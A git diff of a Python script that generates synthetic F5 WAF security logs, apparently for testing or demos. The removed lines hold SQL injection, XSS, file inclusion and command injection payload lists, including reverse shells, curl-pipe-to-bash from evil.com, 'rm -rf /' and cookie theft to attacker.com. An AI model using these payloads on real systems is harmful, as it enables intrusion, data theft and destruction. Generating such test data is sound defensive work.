@@ -2,62 +2,42 @@ import random
 import json
 from datetime import datetime, timedelta
 
-# Function to generate a random IP address
+# Load data from the external JSON file
+with open("list.json", "r") as f:
+    data = json.load(f)
+
+# Assigning lists from the loaded data
+hostnames = data["hostnames"]
+subdomains = data["subdomains"]
+domains = data["domains"]
+tlds = data["tlds"]
+attacks = data["attacks"]
+http_policy_names = data["http_policy_names"]
+waf_actions = data["waf_actions"]
+webkit_engines = data["webkit_engines"]
+sql_payload = data["sql_payloads"]
+comand_injection_payloads = data["comand_injection_payloads"]
+xss_payloads = data["xss_payloads"]
+file_inclusion_payloads = data["file_inclusion_payloads"]
+uri=data["uri"]
+
+
+
+# To generate a random IP address
 def random_ip():
     return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
 
-# Function to generate a random hostname
+# To generate a random hostname
 def random_fqdn():
-    hostnames = ['bigip', 'device', 'server', 'node', 'host', 'system']
-    subdomains = ['pme-ds', 'corp', 'prod', 'dev', 'test']
-    domains = ['f5', 'example', 'company', 'network', 'intranet']
-    tlds = ['com', 'net', 'org', 'io', 'tech']
-
     return f"{random.choice(hostnames)}-{random.randint(1, 100)}.{random.choice(subdomains)}.{random.choice(domains)}.{random.choice(tlds)}"
 
-#List of Waf Action
-waf_actions = ["Allow", "Block", "Challenge", "Log", "Redirect", "Monitor", "Drop", "Notify", "Custom Response", "Rate Limit", "Sanitize", "Transform", "Whitelist", "Blacklist", "Inspect", "Throttle", "IP Blackhole", "Content Filtering", "Response Header Modification"]
 
-
-# List of predefined HTTP policy names
-http_policy_names = [
-    "/Common/topaz4-web4",
-    "/Common/security_policy_1",
-    "/Common/security_policy_2",
-    "/Common/advanced_security",
-    "/Common/default_security_policy",
-    "/Common/strict_policy",
-    "/Common/relaxed_policy",
-    "/Common/low_risk_policy",
-    "/Common/high_risk_policy",
-    "/Common/custom_policy"
-]
-
-#list of webkitengines
-webkit_engines = [
-    "AppleWebKit",
-    "Blink",
-    "KHTML",
-    "Safari",
-    "Chromium",
-    "QtWebKit",
-    "Android WebKit",
-    "PlayStation WebKit",
-    "BlackBerry WebKit",
-    "Tizen WebKit",
-    "WebKitGTK",
-    "Epiphany",
-    "PhantomJS",
-    "UCWebKit",
-    "Adobe AIR WebKit"
-]
-
-
-# Function to generate a random string of a specified length
+# To generate a random string
 def random_string(length):
     letters = "abcdefghijklmnopqrstuvwxyz0123456789"
     return ''.join(random.choice(letters) for _ in range(length))
 
+# To generate a random user-agent
 def random_user_agent():
     browsers = ['Mozilla/5.0', 'Chrome/99.0', 'Safari/14.0', 'Opera/74.0']
     os_types = ['Windows NT 10.0', 'Macintosh; Intel Mac OS X 10_15_7', 'Linux x86_64', 'X11; Ubuntu; Linux x86_64']
@@ -66,168 +46,25 @@ def random_user_agent():
     
     return f"{random.choice(browsers)} ({random.choice(os_types)}) {random.choice(webkit_engines)}/{browser_version}.0 (KHTML, like Gecko) Version/{os_version}.0"
 
-sqlpayloads = [
-    "' OR '1'='1",
-    "' OR 1=1--",
-    "' OR 'a'='a",
-    "' OR ''='",
-    "' OR 1=1 LIMIT 1 --",
-    "' OR 1=1#",
-    "admin'--",
-    "' OR '1'='1'--",
-    "' OR 1=1-- -",
-    "' UNION SELECT null, null--",
-]
 
-cooomand_injection_payloads = [
-    "; ls",
-    "; whoami",
-    "; uname -a",
-    "; id",
-    "; cat /etc/passwd",
-    "|| ls",
-    "&& ls",
-    "| ls",
-    "`ls`",
-    "$(ls)",
-    "& whoami",
-    "; ping -c 4 8.8.8.8",
-    "; curl http://evil.com",
-    "; wget http://malicious.com/malware",
-    "; nslookup example.com",
-    "; sleep 10",
-    "; rm -rf /",
-    "; touch /tmp/exploit",
-    "; ifconfig",
-    "; ps aux",
-    "; netstat -an",
-    "; nc -e /bin/sh 10.0.0.1 4444",
-    "; echo 'exploit' > /tmp/exploit.txt",
-    "; chmod 777 /tmp/exploit",
-    "; killall -9 httpd",
-    "; shutdown -h now",
-    "& dir",
-    "& ipconfig",
-    "& net user",
-    "& netstat -an",
-    "& tasklist",
-    "& whoami",
-    "& shutdown -s",
-    "& curl http://attacker.com",
-    "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
-    "; ls > /tmp/output.txt",
-    "; cat /etc/passwd | grep root",
-    "; nc -lvp 4444 > /tmp/output.txt",
-    "; echo 'Hello' | mail -s 'Subject' attacker@evil.com",
-    "; curl http://evil.com/shell.sh | bash",
-    "; perl -e 'print `/etc/passwd`'",
-    "; python -c 'import os; os.system(\"ls\")'",
-    "; ls && whoami",
-    "; uname -a || id",
-    "| ls; whoami",
-    "`ls; whoami`",
-    "$(ls; whoami)",
-    "; sleep 10",
-    "; ping -c 10 127.0.0.1",
-    "; timeout 10",
-    "& timeout /t 10",
-    "| ping -n 10 localhost"
-]
-
-xss_payloads = [
-    "<script>alert('XSS')</script>",
-    "<img src='x' onerror='alert(1)'>",
-    "<svg onload='alert(1)'>",
-    "<iframe src='javascript:alert(1)'></iframe>",
-    "<body onload=alert(1)>",
-    "<input type='text' value='' onfocus='alert(1)'>",
-    "<a href='javascript:alert(1)'>Click me</a>",
-    "<object data='javascript:alert(1)'></object>",
-    "<embed src='javascript:alert(1)'>",
-    "<link rel='stylesheet' href='javascript:alert(1)'>",
-    "<form action='javascript:alert(1)'><input type='submit'></form>",
-    "<video src='x' onerror='alert(1)'></video>",
-    "<audio src='x' onerror='alert(1)'></audio>",
-    "<details open ontoggle='alert(1)'></details>",
-    "<marquee onstart='alert(1)'>",
-    "<table background='javascript:alert(1)'>",
-    "<div onpointerover='alert(1)'>Hover me</div>",
-    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
-    "javascript:alert(1)",
-    "onmouseover='alert(1)'",
-    "';alert(String.fromCharCode(88,83,83));//",
-    "<script>confirm('XSS')</script>",
-    "<img src=x onerror=alert(document.cookie);>",
-    "<svg><script>alert('XSS')</script></svg>",
-    "'';!--\"<XSS>=&{()}",
-    "<iframe srcdoc='<script>alert(1)</script>'>",
-    "<math><mtext></mtext><script>alert(1)</script></math>",
-    "<style>@import 'javascript:alert(1)';</style>",
-    "<img src=x onerror=this.src='http://attacker.com/?cookie='+document.cookie>",
-    "<input onfocus=alert(1) autofocus>",
-    "<button onclick=alert(1)>Click me</button>",
-    "<img src='#' onerror=alert(1)>",
-    "<img src=1 onerror=alert(1)>",
-    "<div style=background-image:url('javascript:alert(1)')>",
-    "<base href='javascript:alert(1)//'>"
-]
-
-file_inclusion_payloads = [
-    "../../../../etc/passwd",
-    "../../../../../../etc/passwd",
-    "../../../../../../../../etc/passwd",
-    "/etc/passwd",
-    "/proc/self/environ",
-    "../../../../etc/shadow",
-    "../../../../../../etc/shadow",
-    "../../../../../../../../etc/shadow",
-    "../../../../../../../../windows/system32/drivers/etc/hosts",
-    "/windows/system32/drivers/etc/hosts",
-    "../../../../../../../../windows/win.ini",
-    "/windows/win.ini",
-    "../../../../../../../../boot.ini",
-    "/windows/system.ini",
-    "../../../../../../../../windows/system.ini",
-    "../../../../../../../../usr/local/apache2/conf/httpd.conf",
-    "/usr/local/apache2/conf/httpd.conf",
-    "../../../../../../../../usr/local/apache2/conf/extra/httpd-vhosts.conf",
-    "/usr/local/apache2/conf/extra/httpd-vhosts.conf",
-    "../../../../../../../../var/www/html/index.php",
-    "/var/www/html/index.php",
-    "../../../../../../../../var/log/apache2/access.log",
-    "/var/log/apache2/access.log",
-    "../../../../../../../../var/log/apache2/error.log",
-    "/var/log/apache2/error.log",
-    "../../../../../../../../var/lib/mysql/mysql/user.MYD",
-    "/var/lib/mysql/mysql/user.MYD",
-    "../../../../../../../../var/lib/mysql/mysql/user.frm",
-    "/var/lib/mysql/mysql/user.frm",
-    "../../../../../../../../proc/self/fd/0",
-    "../../../../../../../../proc/self/fd/1",
-    "../../../../../../../../proc/self/fd/2",
-    "../../../../../../../../proc/self/cmdline",
-    "../../../../../../../../proc/self/stat",
-    "../../../../../../../../proc/self/mounts",
-    "/../../../../../../../../dev/urandom",
-    "/../../../../../../../../dev/null",
-    "/../../../../../../../../dev/random",
-    "/../../../../../../../../dev/tcp/10.0.0.1/8080",
-    "../../../../../../../../../../dev/tcp/localhost/8888",
-    "/../../../../../../../../dev/tcp/localhost/4444",
-    "../../../../../../../../var/www/index.php?file=/etc/passwd",
-    "../../../../../../../../var/www/index.php?page=/etc/passwd",
-    "../../../../../../../../index.php?page=/etc/passwd",
-    "../../../../../../../../index.php?file=/etc/passwd",
-    "../../../../../../../../index.php?path=/etc/passwd"
-]
+#Specifying port for protocol
+protocol = random.choice(["HTTP", "HTTPS"])
+dest_port = 80 if protocol == "HTTP" else 443
 
 
 
-# Function to generate a syslog format log entry
+
+# generates a syslog format log entry
 def generate_syslog_log():
     now = datetime.now() - timedelta(days=random.randint(0, 30), hours=random.randint(0, 23), minutes=random.randint(0, 59))
     fqdn = random_fqdn()
     destip = random_ip()
+    ruri = random.choice(uri)
+    reqmethod = random.choice(["GET", "POST"])
+
+    # Randomly select a pair of attack type and corresponding signature name
+    attack_type, sig_name = random.choice(list(attacks.items()))
+
     log = (
         f"<134>{now.strftime('%b %d %H:%M:%S')} {fqdn} ASM:"
         f'unit_hostname="{fqdn}",'
@@ -240,26 +77,25 @@ def generate_syslog_log():
         f'response_code="{random.randint(200, 500)}",'
         f'ip_client="{random_ip()}",'
         f'route_domain="{random.randint(0, 100)}",'
-        f'method="{random.choice(["GET", "POST"])}",'
-        f'protocol="HTTP",'
+        f'method="{reqmethod}",'
+        f'protocol={protocol},'
         f'query_string="key1=val1&key2=val2",'
         f'x_forwarded_for_header_value="{random_ip()}",'
         f'sig_ids="{random.randint(1, 999999999)}",'
-        f'sig_names="Automated client access %22wget%22",'
+        f'sig_names="{sig_name}",'
         f'date_time="{now.strftime("%Y-%m-%d %H:%M:%S")}",'
         f'severity="Error",'
-        f'attack_type="Non-browser client",'
+        f'attack_type="{attack_type}",'
         f'geo_location="USA/NY",'
         f'ip_address_intelligence="Botnets, Scanners",'
-        f'username="Admin",'
         f'session_id="{random_string(16)}",'
         f'src_port="{random.randint(1024, 65535)}",'
-        f'dest_port="{random.randint(1, 65535)}",'
+        f'dest_port="{dest_port}",'
         f'dest_ip="{destip}",'
         f'sub_violations="Bad HTTP version, Null in request",'
         f'virus_name="Melissa",'
-        f'uri="/",'
-        f'request="GET / HTTP/1.0\\r\\nUser-Agent:  {random_user_agent()}\\r\\nAccept: */*\\r\\nHost: {destip}\\r\\nConnection: Keep-Alive\\r\\n\\r\\n",'
+        f'uri="{ruri}",'
+        f'request="{reqmethod} {ruri} HTTP/1.0\\r\\nUser-Agent:  {random_user_agent()}\\r\\nAccept: */*\\r\\nHost: {destip}\\r\\nConnection: Keep-Alive\\r\\n\\r\\n",'
         f'headers="Host: myhost.com; Connection: close",'
         f'response="HTTP/1.1 200 OK Content-type: text/html Content-Length: 7 <html/>",'
         f'violation_details="<?xml version=\'1.0\' encoding=\'UTF-8\'?><BAD_MSG><request-violations><violation><viol_index>14</viol_index><viol_name>VIOL_HTTP_PROTOCOL</viol_name><http_sanity_checks_status>65536</http_sanity_checks_status><http_sub_violation_status>65536</http_sub_violation><http_sub_violation>SFRUUCB2ZXJzaW9uIG5vdCBmb3VuZA==</http_sub_violation></violation></request-violations></BAD_MSG>"'
@@ -278,7 +114,7 @@ def generate_cef_log():
         f"cs2Label=http_class_name deviceCustomDate1={now.strftime('%b %d %Y %H:%M:%S')} "
         f"deviceCustomDate1Label=policy_apply_date externalId={random.randint(1000000000000000000, 9999999999999999999)} "
         f"act=blocked cn1=0 cn1Label=src={random_ip()} spt={random.randint(1024, 65535)} "
-        f"dst={destip} dpt=80 requestMethod={random.choice(["GET", "POST"])} app=HTTP cs5=N/A cs5Label=x_forwarded_for_header_value "
+        f"dst={destip} dpt={dest_port} requestMethod={random.choice(["GET", "POST"])} app={protocol} cs5=N/A cs5Label=x_forwarded_for_header_value "
         f"rt={now.strftime('%b %d %Y %H:%M:%S')} deviceExternalId=0 cs4=Non-browser Client "
         f"cs4Label=attack_type cs6=N/A cs6Label=geo_location c6a1= c6a1Label=device_address "
         f"c6a2= c6a2Label=source_address c6a3= c6a3Label=destination_address c6a4=N/A "
